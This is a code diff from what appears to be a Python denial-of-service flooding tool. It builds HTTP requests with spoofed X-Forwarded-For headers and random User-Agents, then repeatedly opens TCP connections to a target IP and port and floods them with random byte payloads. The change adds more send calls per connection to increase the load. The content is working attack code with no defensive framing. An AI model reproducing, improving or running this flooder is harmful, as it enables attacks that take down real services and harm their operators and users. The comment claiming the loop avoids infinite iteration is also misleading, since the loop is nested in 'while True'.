@@ -58,13 +58,21 @@ if method == "TCP":
         httpss = "User-Agent: " + random.choice(https) + "\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(150404)
+        grtools = random._urandom(15404)
         while True:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.connect((ip, port))
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
                 for _ in range(150000):  # Reduce the number of iterations to avoid an infinite loop
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
                 sock.close()
